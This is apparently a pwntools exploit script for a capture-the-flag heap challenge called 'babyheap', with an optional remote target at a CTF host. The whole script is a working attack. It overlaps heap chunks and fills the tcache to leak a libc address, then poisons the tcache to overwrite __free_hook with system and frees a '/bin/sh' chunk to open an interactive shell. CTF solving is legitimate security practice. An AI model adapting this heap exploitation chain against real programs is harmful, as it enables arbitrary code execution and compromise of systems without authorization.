#!/usr/bin/python

from pwn import *

def allocate(idx,size,payload):
	r.sendlineafter(">> ",'1')
	r.sendlineafter("Index: ",str(idx))
	r.sendlineafter("Size: ",str(size))
	r.sendafter("Content: ",payload)

def delete(idx):
	r.sendlineafter(">> ",'2')
	r.sendlineafter("Index: ",str(idx))

def show(idx):
	r.sendlineafter(">> ",'3')
	r.sendlineafter("Index: ",str(idx))
	r.recvuntil("content: ")
	return r.recvline(False)

def exploit():
	allocate(0,0x88,'?'*8)
	allocate(1,0x98,'?'*8)
	allocate(2,0xf8,'?'*8)
	allocate(3,0x20,'?'*8)
	for i in xrange(4,12): allocate(i,0x88 if i < 11 else 0xf8,'?'*8)
	allocate(15,0x20,'?'*8)

	for i in xrange(4,12): delete(i)
	for i in xrange(4,12): allocate(i,0xf8,'?'*8)
	for i in xrange(4,12): delete(i)

	delete(0)
	delete(1)
	payload = '?'*8
	payload = payload.ljust(0x90,'\x00')
	payload += p64(0x90+0xa0)
	allocate(1,0x98,payload)

	delete(2)
	for i in xrange(4,11): allocate(i,0x80,'?'*8)
	
	allocate(0,0x80,'?'*8)
	libc_leak = u64(show(1).ljust(8,'\x00'))
	libc.address = libc_leak-0x3ebca0
	target = libc.symbols["__free_hook"]
	log.info("libc leak: {}".format(hex(libc_leak)))
	log.info("libc base: {}".format(hex(libc.address)))
	log.info("__free_hook: {}".format(hex(target)))

	for i in xrange(4,10): delete(i)

	allocate(4,0x90,'?'*8)
	delete(1)
	delete(4)

	allocate(4,0x90,p64(target))
	allocate(5,0x90,'?'*8)
	allocate(6,0x90,p64(libc.symbols["system"]))

	allocate(7,0x100,"/bin/sh\x00")
	delete(7)

	r.interactive()

exe = ELF("./babyheap")
libc = exe.libc

if len(sys.argv) < 2:
	r = process(exe.path,aslr=False)
	a = lambda: gdb.attach(r,"""
		b *0x555555554ccb
		b *0x555555554d83
		b *0x555555554e77
		c
	""")
else:
	r = remote("babyheap.problem.cscctf.com",11113)

exploit()